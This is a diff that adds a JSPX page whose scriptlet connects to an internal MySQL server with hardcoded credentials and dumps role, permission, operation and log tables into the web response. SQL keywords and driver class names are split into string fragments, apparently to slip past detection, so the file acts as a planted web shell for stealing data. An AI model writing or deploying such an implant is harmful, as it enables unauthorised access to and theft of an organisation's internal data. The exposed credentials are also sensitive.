@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+<jsp:scriptlet>
+String url = "jdbc:" + "mysql://10.1.1.241:3306/move?useSSL=false";
+try { Class.forName("com." + "mysql.jdbc.Driver"); } catch (Throwable t) { try { Class.forName("com." + "mysql.cj.jdbc.Driver"); } catch (Throwable t2) {} }
+java.sql.Connection c = java.sql.DriverManager.getConnection(url, "myuser", "Boxinkeji168!");
+java.sql.Statement st = c.createStatement();
+String[] qs = {
+ "SEL"+"ECT * FR"+"OM app_role",
+ "SEL"+"ECT * FR"+"OM res_app_role",
+ "SEL"+"ECT * FR"+"OM per_r",
+ "SEL"+"ECT * FR"+"OM system_operation LIMIT 20",
+ "SEL"+"ECT * FR"+"OM user_app_log_file LIMIT 10"
+};
+for (String q : qs) {
+ out.print("### " + q + "\n");
+ java.sql.ResultSet rs = st.executeQuery(q);
+ java.sql.ResultSetMetaData md = rs.getMetaData();
+ int n = md.getColumnCount();
+ while (rs.next()) { for (int i=1;i!=n+1;i++) out.print(md.getColumnLabel(i) + "=" + rs.getString(i) + " | "); out.print("\n"); }
+ rs.close();
+}
+st.close(); c.close();
+</jsp:scriptlet>
+</jsp:root>
